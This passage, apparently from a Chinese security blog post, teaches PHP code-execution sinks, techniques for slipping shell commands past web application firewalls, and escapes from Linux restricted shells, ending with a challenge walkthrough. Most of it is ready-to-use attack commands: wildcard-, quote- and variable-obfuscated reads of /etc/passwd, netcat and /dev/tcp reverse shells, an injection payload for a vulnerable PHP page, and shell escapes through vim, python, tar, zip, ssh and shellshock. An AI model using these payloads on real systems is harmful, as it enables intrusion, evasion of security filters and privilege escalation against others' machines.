+<p>下面的代码，由于调用了<strong>ob_end_flush()</strong>，所以会调用ob_start($cmd)中的cmd，把我们输入的$_GET[a]作为cmd的参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = <span class="string">'system'</span>;</span><br><span class="line">	ob_start($cmd);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;</span><br><span class="line">	ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:2500/codeexec.php?a=whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h3><p><a href="http://php.net/manual/zh/function.mail.php" target="_blank" rel="noopener">mail 文档</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">	string $to ,</span><br><span class="line">	string $subject ,</span><br><span class="line">	string $message [,</span><br><span class="line">	string $additional_headers [,</span><br><span class="line">	string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p>
+<ul>
+<li>配置SMTP服务器的主机名和端口</li>
+<li>配置PHP用作邮件传输代理（MTA）的文件路径</li>
+</ul>
+<p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p>
+<h1 id="0x02-命令执行WAF绕过技巧总结"><a href="#0x02-命令执行WAF绕过技巧总结" class="headerlink" title="0x02 命令执行WAF绕过技巧总结"></a>0x02 命令执行WAF绕过技巧总结</h1><h2 id="技巧一：通配符"><a href="#技巧一：通配符" class="headerlink" title="技巧一：通配符"></a>技巧一：通配符</h2><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 0 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line">[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』</span><br><span class="line">[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line">[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用通配符来执行命令，例如执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br><span class="line">使用通配符</span><br><span class="line">/?<span class="keyword">in</span>/?s -l</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502835_5ba46e73d257c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502835_5ba46e73d257c.png!small" alt="使用通配符来执行命令"></a></p>
+<p>读取/etc/passwd：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/???/??t /??c/p???w?</span><br><span class="line">有时候WAF不允许使用太多的?号</span><br><span class="line">/?<span class="keyword">in</span>/cat /?tc/p?sswd</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502841_5ba46e7975cd2.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502841_5ba46e7975cd2.png!small" alt="读取/etc/passwd"></a></p>
+<p>NC反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 127.0.0.1 3737</span><br><span class="line">为了避免符号.我们可以将IP地址转换成整型。</span><br><span class="line">127.0.0.1 → 2130706433</span><br><span class="line"></span><br><span class="line">使用通配符</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># /??n/?c -e /??n/b??h 2130706433 3737</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502846_5ba46e7e6b184.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502846_5ba46e7e6b184.png!small" alt="NC反弹shell"></a></p>
+<p><a href="https://image.3001.net/images/20180921/1537502851_5ba46e8347baa.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502851_5ba46e8347baa.png!small" alt="NC反弹shell"></a></p>
+<h2 id="技巧二：连接符"><a href="#技巧二：连接符" class="headerlink" title="技巧二：连接符"></a>技巧二：连接符</h2><p>在bash的操作环境中还有一个非常有用的功能，那就是连接符，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo hello</span></span><br><span class="line">hello</span><br><span class="line">root@kali:~<span class="comment"># echo h'ello</span></span><br><span class="line">&gt; <span class="string">'</span></span><br><span class="line"><span class="string">hello</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~# echo '</span>h<span class="string">'ell'</span>o<span class="string">'</span></span><br><span class="line"><span class="string">hello</span></span><br></pre></td></tr></table></figure>
+
+<p>你唯一需要注意的就是闭合，这点很重要，利用这个我们可以绕过一些匹配字符串的WAF规则。</p>
+<p>读取/etc/passwd：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">'b'</span>i<span class="string">'n'</span>/<span class="string">'c'</span>a<span class="string">'t'</span> /<span class="string">'e'</span>t<span class="string">'c'</span>/<span class="string">'p'</span>a<span class="string">'s'</span>s<span class="string">'w'</span>d</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502856_5ba46e88a070e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502856_5ba46e88a070e.png!small" alt="读取/etc/passwd"></a></p>
+<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>检测NC：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">'b'</span>i<span class="string">'n'</span>/<span class="string">'w'</span>h<span class="string">'i'</span>c<span class="string">'h'</span> <span class="string">'n'</span>c</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502861_5ba46e8d4ba6b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502861_5ba46e8d4ba6b.png!small" alt="检测NC"></a></p>
+<p>没有NC的情况检查wget：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">'b'</span>i<span class="string">'n'</span>/<span class="string">'w'</span>h<span class="string">'i'</span>c<span class="string">'h'</span> <span class="string">'w'</span>g<span class="string">'e'</span>t</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502866_5ba46e92406de.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502866_5ba46e92406de.png!small" alt="没有NC的情况检查wget"></a></p>
+<p>简单粗暴（容易被检查）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">'sh -i &amp;&gt;/dev/tcp/2130706433/3737 0&gt;&amp;1'</span></span><br></pre></td></tr></table></figure>
+
+<p>其他字符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">双引号</span><br><span class="line">/<span class="string">"b"</span>i<span class="string">"n"</span>/<span class="string">"w"</span>h<span class="string">"i"</span>c<span class="string">"h"</span> <span class="string">"n"</span>c</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502872_5ba46e98ecccb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502872_5ba46e98ecccb.png!small" alt="其他字符"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反斜杆</span><br><span class="line">/b\i\n/w\h\i\c\h n\c</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502879_5ba46e9f57574.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502879_5ba46e9f57574.png!small" alt="反斜杆"></a></p>
+<h2 id="技巧三：未初始化的bash变量"><a href="#技巧三：未初始化的bash变量" class="headerlink" title="技巧三：未初始化的bash变量"></a>技巧三：未初始化的bash变量</h2><p>在bash环境中允许我们使用未初始化的bash变量，如何</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span></span><br></pre></td></tr></table></figure>
+
+<p>我们事先并没有定义它们，输出看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo $a</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># echo $b</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># echo $c</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>未初始化的变量值都是null。</p>
+<p>读取/etc/passwd：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat<span class="variable">$a</span> /etc<span class="variable">$a</span>/passwd<span class="variable">$a</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502886_5ba46ea63da4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502886_5ba46ea63da4c.png!small" alt="读取/etc/passwd"></a></p>
+<h3 id="测试WAF"><a href="#测试WAF" class="headerlink" title="测试WAF"></a>测试WAF</h3><p>测试代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"OK"</span>;</span><br><span class="line">system(<span class="string">'dig '</span>.<span class="variable">$_GET</span>[<span class="string">'host'</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502890_5ba46eaae5868.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502890_5ba46eaae5868.png!small" alt="测试WAF"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com;<span class="variable">$s</span>/bin<span class="variable">$s</span>/<span class="built_in">which</span><span class="variable">$s</span> nc<span class="variable">$s</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180921/1537502895_5ba46eaf5c2cf.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502895_5ba46eaf5c2cf.png!small" alt="测试代码"></a></p>
+<p>反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin<span class="variable">$s</span>/nc<span class="variable">$s</span> -e /bin<span class="variable">$s</span>/bash<span class="variable">$s</span> 2130706433 3737</span><br></pre></td></tr></table></figure>
+
+<p>执行：</p>
+<p><a href="https://image.3001.net/images/20180921/1537502900_5ba46eb46ac57.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502900_5ba46eb46ac57.png!small" alt="执行"></a></p>
+<p>成功：</p>
+<p><a href="https://image.3001.net/images/20180921/1537502905_5ba46eb9427e5.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180921/1537502905_5ba46eb9427e5.png!small" alt="成功"></a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文我们主要利用了bash的通配符、连接符、未初始化的变量三个特性来绕过WAF规则，当然你可能有更好的办法，欢迎大家补充，最后感谢乐于分享的安全研究员们，没他们的分享也不会有这么多技巧出现，谢谢分享。</p>
+<h1 id="0x03-Linux-Restricted-Shell绕过技巧总结"><a href="#0x03-Linux-Restricted-Shell绕过技巧总结" class="headerlink" title="0x03 Linux Restricted Shell绕过技巧总结"></a>0x03 Linux Restricted Shell绕过技巧总结</h1><h2 id="一、什么是Restricted-Shell"><a href="#一、什么是Restricted-Shell" class="headerlink" title="一、什么是Restricted Shell"></a>一、什么是Restricted Shell</h2><p>Restricted Shell既受限的shell，它与一般标准shell的区别在于会限制执行一些行为，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 cd 来改变路径</span><br><span class="line">设置或取消SHELL,PATH,ENV,或BASH_ENV变量的值</span><br><span class="line">指定的命令名中包含/</span><br></pre></td></tr></table></figure>
+
+<h3 id="如何设置一个Restricted-Shell"><a href="#如何设置一个Restricted-Shell" class="headerlink" title="如何设置一个Restricted Shell"></a><strong>如何设置一个Restricted Shell</strong></h3><p>我们可以先复制一个bash，然后设置某个用户登录后运行的shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash  /bin/rbash</span><br><span class="line">useradd -s /bin/rbash zusheng</span><br></pre></td></tr></table></figure>
+
+<p>然后允许不允许什么命令，就可以自行修改了。</p>
+<h2 id="二、枚举Linux环境"><a href="#二、枚举Linux环境" class="headerlink" title="二、枚举Linux环境"></a>二、枚举Linux环境</h2><p>首先我们需要去检查Linux环境能做什么，这相当于一个收集情报的工作，这个步骤必不可少，有了情报才可以分析下一步骤该如何去做。</p>
+<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>检查可用的命令：</strong></p>
+<blockquote>
+<p>如cd、ls、echo等</p>
+</blockquote>
+<p><a href="https://image.3001.net/images/20181110/1541820877_5be651cd47f6f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820877_5be651cd47f6f.png!small" alt="检查可用的命令"></a></p>
+<p><strong>操作符：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">&lt;</span><br><span class="line">|</span><br></pre></td></tr></table></figure>
+
+<p><strong>root身份运行哪些命令：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><strong>检查shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br><span class="line">基本上都是/bin/rbash</span><br></pre></td></tr></table></figure>
+
+<h3 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h3><p>检查可用的编程语言，如python、perl、ruby等</p>
+<p><a href="https://image.3001.net/images/20181110/1541820884_5be651d4f16c8.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820884_5be651d4f16c8.png!small" alt="编程语言"></a></p>
+<h3 id="检查环境变量"><a href="#检查环境变量" class="headerlink" title="检查环境变量"></a>检查环境变量</h3><p>运行env或者printenv</p>
+<h2 id="三、常见利用技术"><a href="#三、常见利用技术" class="headerlink" title="三、常见利用技术"></a>三、常见利用技术</h2><h3 id="“-”字符被允许"><a href="#“-”字符被允许" class="headerlink" title="“/”字符被允许"></a>“/”字符被允许</h3><p>如果/被允许，我们可以直接运行：</p>
+<p><a href="https://image.3001.net/images/20181110/1541820889_5be651d9b9089.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820889_5be651d9b9089.png!small" alt="常见利用技术"></a></p>
+<p>允许：</p>
+<p><a href="https://image.3001.net/images/20181110/1541820893_5be651dd2ef0e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820893_5be651dd2ef0e.png!small" alt="常见利用技术"></a></p>
+<h3 id="cp命令被允许"><a href="#cp命令被允许" class="headerlink" title="cp命令被允许"></a>cp命令被允许</h3><p>如果cp命令被允许，我们可以直接复制/bin/bash到本用户目录：</p>
+<p><a href="https://image.3001.net/images/20181110/1541820898_5be651e23b6c0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820898_5be651e23b6c0.png!small" alt="cp命令被允许"></a></p>
+<p>允许：</p>
+<p><a href="https://image.3001.net/images/20181110/1541820902_5be651e609637.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820902_5be651e609637.png!small" alt="cp命令被允许"></a></p>
+<h3 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a>常见应用</h3><p>探测系统中是否存在常见应用，如FTP、GDB等</p>
+<p>FTP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &gt; !/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>GDB：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb &gt; !/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20181110/1541820907_5be651eb2e109.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181110/1541820907_5be651eb2e109.png!small" alt="常见应用"></a></p>
+<p>man/git：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man &gt; !/bin/sh</span><br><span class="line">git &gt; git <span class="built_in">help</span> status</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20181110/1541820915_5be651f3694bf.png!small" alt="常见应用"><img src="https://image.3001.net/images/20181110/1541820919_5be651f7cccaa.png!small" alt="VIM"></p>
+<p>vim：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/sh 或者 !/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20181110/1541820924_5be651fcae8f6.png!small" alt="VIM"></p>
+<p>允许情况下：</p>
+<p><img src="https://image.3001.net/images/20181110/1541820929_5be652013957a.png!small" alt="允许情况下"></p>
+<p>more/less</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="string">'sh'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20181110/1541820936_5be65208ce705.png!small" alt="more/less"><img src="https://image.3001.net/images/20181110/1541820943_5be6520f69d1c.png!small" alt="more/less"></p>
+<h3 id="set-shell"><a href="#set-shell" class="headerlink" title="set shell"></a>set shell</h3><p>在一些编辑器或命令中我们还以为设置shell变量然后执行，比如vim中：</p>
+<p><img src="https://image.3001.net/images/20181110/1541820955_5be6521b1eaec.png!small" alt="set shell"><img src="https://image.3001.net/images/20181110/1541820962_5be6522246cf0.png!small" alt="set shell"></p>
+<h3 id="更改PATH或SHELL环境变量"><a href="#更改PATH或SHELL环境变量" class="headerlink" title="更改PATH或SHELL环境变量"></a>更改PATH或SHELL环境变量</h3><p>输入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export -p</span><br></pre></td></tr></table></figure>
+
+<p>查看</p>
+<p><img src="https://image.3001.net/images/20181110/1541820968_5be65228e6fe6.png!small" alt="æ¥ç"></p>
+<p>PATH和SHELL变量很可能是’-rx’，这意味着你只能执行不能写入，如果可写，你就可以直接写入/bin/bash。</p>
+<h3 id="编程语言-1"><a href="#编程语言-1" class="headerlink" title="编程语言"></a>编程语言</h3><p>python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import os; os.system("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<p>php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -a then exec(<span class="string">"sh -i"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>perl：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'exec "/bin/sh";'</span></span><br></pre></td></tr></table></figure>
+
+<p>lua：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">'/bin/sh'</span>).</span><br></pre></td></tr></table></figure>
+
+<p>ruby：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="最新技术"><a href="#最新技术" class="headerlink" title="最新技术"></a>最新技术</h3><p>ssh:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@IP - t <span class="string">"/bin/sh"</span> or <span class="string">"/bin/bash"</span></span><br></pre></td></tr></table></figure>
+
+<p>ssh2:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@IP -t <span class="string">"bash --noprofile"</span></span><br></pre></td></tr></table></figure>
+
+<p>ssh3:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@IP -t <span class="string">"() &#123; :; &#125;; /bin/bash"</span> (shellshock)</span><br></pre></td></tr></table></figure>
+
+<p>ssh4:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=<span class="string">"sh -c /tmp/yourfile.sh"</span> 127.0.0.1 (SUID)</span><br></pre></td></tr></table></figure>
+
+<p>ZIP:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip /tmp/test.zip /tmp/<span class="built_in">test</span> -T --unzip-command=<span class="string">"sh -c /bin/bash"</span></span><br></pre></td></tr></table></figure>
+
+<p>tar:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>awk:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p>scp：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./</span><br></pre></td></tr></table></figure>
+
+<p>scp -S program： 指定加密传输时所使用的程序</p>
+<p>我们这个spellbash.sh脚本功能就在于给shell加权限执行</p>
+<p>shell代码如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    setresuid(geteuid(), geteuid(), geteuid());</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">"/bin/bash"</span>, argv,  envp);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pico：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pico -s &quot;/bin/bash&quot;</span><br><span class="line">然后输入/bin/bash按CTRL + T</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、实战操作"><a href="#四、实战操作" class="headerlink" title="四、实战操作"></a>四、实战操作</h2><p>针对于Linux Restricted Shell绕过技巧基本上是介绍到了，接下来就是灵活运用的问题，我这里选择了一个挑战来运用一下文中的一些技术。</p>
+<p>连接上机器，经过一番信息收集，我们发现只有vim可以利用一下：</p>
+<p><img src="https://image.3001.net/images/20181110/1541820978_5be652327a4ec.png!small" alt="实战操作"></p>
+<p>尝试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">/bin/rbash: /bin/bash: restricted: cannot specify `/<span class="string">' in command names</span></span><br></pre></td></tr></table></figure>
+
+<p>继续尝试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>可以发现我们成功绕过了rbash：</p>
+<p><img src="https://image.3001.net/images/20181110/1541820983_5be65237b6e8c.png!small" alt="成功绕过了rbash"></p>
+<p>随后我们发现当前用户没有<strong>打开目标文件的权限</strong>，sudo -l查看一下能运行哪些命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(app-script-ch14-2) NOPASSWD: /usr/bin/python</span><br></pre></td></tr></table></figure>
+
+<p>我的：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3xm8xv7gj20og05iaap.jpg" alt></p>
+<p>我们以app-script-ch14-2运行python，思路上面也提到了，可以利用python运行bash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c &apos;import os; os.system(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+
+<p>继续sudo -l：</p>
+<p><img src="https://image.3001.net/images/20181110/1541820989_5be6523df3c31.png!small" alt="继续sudo -l"></p>
+<p>tar上面也总结过了：</p>
+<p><img src="https://image.3001.net/images/20181110/1541820995_5be6524339c9e.png!small" alt="tar上面也总结过了"></p>
+<p>接下来套路基本上一样不再演示了。</p>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>正如我们所看到的，总有一种办法来绕过受限制的shell，这里我介绍了常见的例子，但是安全技术的可能性是无穷无尽，希望更多人能分享一下技巧，最后感谢分享技术的黑客、安全研究人员，没有他们的分享就没有这篇文章。</p>
